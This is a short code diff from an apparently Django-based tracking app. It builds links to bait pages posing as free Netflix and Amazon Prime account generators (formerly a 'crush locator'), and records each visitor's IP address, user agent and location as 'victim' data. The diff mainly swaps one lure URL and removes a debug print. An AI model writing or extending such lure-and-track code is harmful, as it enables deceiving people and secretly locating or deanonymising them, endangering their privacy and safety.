@@ -643,7 +643,7 @@ def meme(request,template,username):
     vicuseragent = request.META['HTTP_USER_AGENT']
 
     publicip = str(request.META.get('HTTP_X_REAL_IP'))
-    
+
     user = User.objects.filter(username=secret[:-1]).first()
 
     if user.profile.victimpublicip == '' : # Assigning values for the first time
@@ -679,7 +679,6 @@ def tracker(request):
   if request.method == 'POST':
     username = request.user.username
     user = User.objects.filter(username=username).first()
-    print(request.POST)
     try:
       if request.POST['flush'] == "Confirm":
         user.profile.victimlatitude=""
@@ -701,7 +700,7 @@ def tracker(request):
     if request.POST['template']=='1':
       url = "https://osint.studio/netflixaccountgenerator/" + str(secret)
     else:
-      url = "https://osint.studio/crushlocator/" + str(secret)
+      url = "https://osint.studio/amazonprimegenerator/" + str(secret)
 
     # Fetching values from DB as list
     
